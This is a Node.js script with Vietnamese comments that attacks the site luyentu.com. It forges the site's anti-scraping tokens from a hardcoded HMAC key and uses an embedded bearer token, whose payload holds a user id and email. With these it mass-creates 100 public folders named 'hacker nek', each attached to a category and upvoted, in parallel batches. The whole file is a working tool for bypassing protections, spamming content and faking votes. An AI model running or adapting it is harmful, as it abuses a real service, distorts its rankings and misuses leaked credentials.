const crypto = require('crypto');

/**
 * CẤU HÌNH
 */
const BASE_URL = "https://luyentu.com";
const AUTH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjU5NDE5LCJlbWFpbCI6ImtpdHRlbndhcnJpb3IyMDA1QGdtYWlsLmNvbSIsImlhdCI6MTc3NTgwMTY2NCwiZXhwIjoxNzc1ODAyNTY0fQ.12RF9GWlUo3yRjrW6iOovhRFSHkGHfRew4FAz8-M3sE";
const ANTI_SCRAPE_KEY = "luyentu-anti-scrape-2026"; 
const TOTAL_TASKS = 100; // Tổng số folder muốn tạo
const CONCURRENCY = 5;  // Số luồng chạy song song (máy yếu nên để 10-20 là vừa đẹp)
const CUSTOM_NAME = "hacker nek";

function generateAppToken() {
    const timestamp = Date.now().toString();
    const hash = crypto.createHmac('sha256', ANTI_SCRAPE_KEY)
                       .update(timestamp)
                       .digest('hex')
                       .substring(0, 16);
    return `${timestamp}.${hash}`;
}

const getHeaders = () => ({
    'accept': 'application/json, text/plain, */*',
    'content-type': 'application/json',
    'authorization': AUTH_TOKEN,
    'x-app-token': generateAppToken(),
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Pentest-Turbo/2.0',
    'origin': 'https://luyentu.com'
});

async function runAttackSequence(id) {
    try {
        const randomSuffix = crypto.randomBytes(2).toString('hex');
        const finalName = `${CUSTOM_NAME} #${id} (${randomSuffix})`;

        // BƯỚC 1: TẠO CATEGORY
        const catRes = await fetch(`${BASE_URL}/categories`, {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({ name: finalName, description: "Turbo Test", icon: "fas fa-bolt" })
        });
        const catData = await catRes.json();
        if (!catData.data) return console.error(`[Task ${id}] Thất bại Bước 1`);
        const categoryId = catData.data.id;

        // BƯỚC 2: TẠO FOLDER
        const folderRes = await fetch(`${BASE_URL}/folders`, {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({ name: `Folder ${finalName}` })
        });
        const folderData = await folderRes.json();
        const folderId = folderData.data.id;

        // BƯỚC 3: GẮN CATEGORY
        await fetch(`${BASE_URL}/folders/${folderId}/categories`, {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify({ categoryIds: [categoryId] })
        });

        // BƯỚC 4: PUBLIC
        await fetch(`${BASE_URL}/folders/${folderId}`, {
            method: 'PUT',
            headers: getHeaders(),
            body: JSON.stringify({ isShared: true })
        });

        // BƯỚC 5: UPVOTE
        const upvoteRes = await fetch(`${BASE_URL}/folders/shared/${folderId}/upvote`, {
            method: 'POST',
            headers: getHeaders()
        });
        
        console.log(`[✓] Xong Task ${id} | Folder: ${folderId} | Status: ${upvoteRes.status}`);
    } catch (e) {
        console.error(`[X] Task ${id} sụp: ${e.message}`);
    }
}

/**
 * QUẢN LÝ LUỒNG SONG SONG
 */
async function startTurbo() {
    console.log(`>>> ĐANG CHẠY SONG SONG ${CONCURRENCY} LUỒNG...`);
    const tasks = Array.from({ length: TOTAL_TASKS }, (_, i) => i + 1);
    
    // Chia nhỏ danh sách task để chạy theo cụm song song
    const results = [];
    while (tasks.length > 0) {
        const batch = tasks.splice(0, CONCURRENCY);
        console.log(`\n--- Đang đẩy cụm ${batch.length} request kế tiếp ---`);
        results.push(await Promise.all(batch.map(id => runAttackSequence(id))));
    }
    
    console.log("\n========================================");
    console.log("   BÃO ĐÃ QUÉT QUA! 100 FOLDER ĐÃ LÊN SÀN. ");
    console.log("========================================");
}

startTurbo();